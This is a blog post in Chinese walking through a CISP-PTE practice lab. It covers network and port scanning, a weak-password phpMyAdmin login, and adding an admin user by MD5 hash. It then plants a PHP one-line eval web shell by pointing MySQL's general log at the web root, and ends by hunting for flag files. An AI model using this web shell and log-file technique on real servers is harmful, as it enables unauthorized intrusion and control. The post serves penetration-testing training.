---
layout: post
title: CISP-PTE host综合
subtitle: CISP-PTE host综合
date: 2025-08-17 08:43
author: Kyon-H
header-img: img/post-bg-2015.jpg
tags:
  - 靶场实战
number headings: first-level 2, max 4, 1.1., auto
published: false
---
## 1. 靶场环境

![image.png](https://img.ghostliner.top/daeAAK.png)

## 2. 信息搜集

**网段扫描**

```shell
namp -sn 192.168.163.0/24
```

发现主机 `192.168.163.133`

![image.png](https://img.ghostliner.top/ez0Fj4.png)

**端口扫描**

```shell
nmap -T5 -sS -p- 192.168.163.133
```

发现 80 端口

![image.png](https://img.ghostliner.top/2JBI0K.png)

### 2.1. 站点测试

**访问站点**

![image.png](https://img.ghostliner.top/C8byzv.png)

尝试弱密码登陆失败

**站点扫描**

![image.png](https://img.ghostliner.top/FyhiK5.png)

发现phpmyadmin 登录页面

![image.png](https://img.ghostliner.top/RztLkB.png)

尝试弱密码登录，使用 root:password 登录成功

**版本信息**：

![image.png](https://img.ghostliner.top/GGH4Js.png)

**数据库列表**：

![image.png](https://img.ghostliner.top/OIo6HY.png)

发现 `picture_store` 和 `picture_system` 两个数据库表相同，且都有admin 用户信息

![image.png](https://img.ghostliner.top/2hRoor.png)

admin 密码： `77ad15e68545d32e51bb61ec3325cfda`，尝试MD5 解码失败 hhxxttxs

**思路**：
1. 疑似为 MD5，可以两个数据库都创建新用户，密码使用 MD5 编码，尝试登录
2. 使用 phpMyadmin 先 getshell 后查看登录代码

![image.png](https://img.ghostliner.top/zks6ij.png)

创建用户名：hack，密码： `e10adc3949ba59abbe56e057f20f883e`

![image.png](https://img.ghostliner.top/bPJon9.png)

![image.png](https://img.ghostliner.top/d6ukWw.png)

登录成功，发现key1

![image.png](https://img.ghostliner.top/QZQJnI.png)

F12 查看key1

![image.png](https://img.ghostliner.top/xh4yZQ.png)
## 3. getshell

### 3.1. `INTO OUTFILE`  getshell

查看权限

```sql
show global variables like '%priv%';
show global variables like '%general_log%';
```

![image.png](https://img.ghostliner.top/mvrUvq.png)

`secure_file_priv` 显示NULL，说明无权限使用 `INTO OUTFILE`，会报错：

![image.png](https://img.ghostliner.top/Ykin4g.png)

### 3.2. 日志getshell

查看日志配置

```sql
show global variables like "general_log%";
```

![image.png](https://img.ghostliner.top/knKwFf.png)

更改日志配置

```sql
set global general_log="ON";
set global general_log_file="d:/phpstudy/www/hack.php";
show global variables like "general_log%";
```

修改成功：

![image.png](https://img.ghostliner.top/fO4O5c.png)

注入一句话木马

```sql
select '<?php echo 123;eval($_REQUEST[a]);?>';
```

![image.png](https://img.ghostliner.top/V3ANoJ.png)

访问 `/hack.php?a=PHP info();`，成功执行代码

![image.png](https://img.ghostliner.top/fqQ07n.png)

蚁剑连接

![image.png](https://img.ghostliner.top/PirWj9.png)

查看当前用户为 `system`

![image.png](https://img.ghostliner.top/Nyqsd6.png)

查看登录代码，确定是 MD5 编码

![image.png](https://img.ghostliner.top/Zc1h7Q.png)

查找key 文件

```batch
for /r "d:\" %i in (key*.*) do echo %i
```

发现 `d:\phpStudy\WWW\images\key2.txt`

![image.png](https://img.ghostliner.top/68xoWh.png)

查看文件内容，获取key2

![image.png](https://img.ghostliner.top/zRbram.png)

查看回收站，在C 盘回收站发现key3

![image.png](https://img.ghostliner.top/sPWhPa.png)

![image.png](https://img.ghostliner.top/CIHVug.png)
